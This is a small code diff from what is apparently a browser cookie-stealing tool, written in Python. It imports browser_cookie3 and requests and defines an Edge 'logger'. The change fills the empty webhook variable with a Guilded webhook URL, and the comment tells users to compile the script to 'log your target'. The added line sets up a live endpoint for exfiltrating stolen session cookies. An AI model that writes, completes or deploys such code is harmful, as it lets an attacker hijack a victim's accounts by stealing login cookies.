@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-webhook = "" # Webhook here and make sure to compile if you wanna log your target
+webhook = "https://media.guilded.gg/webhooks/bd105ddb-9c33-4e13-b022-744055899ee6/1oJCB5wNNO8s82yOgmEukqgmEM8iQkuSW64m2usQoU6maUgMcUw6cgSkkWAUWWQYUIAII4CYCiYISIEyWEWMQg" # Webhook here and make sure to compile if you wanna log your target
 
 def edge_logger():
     try:
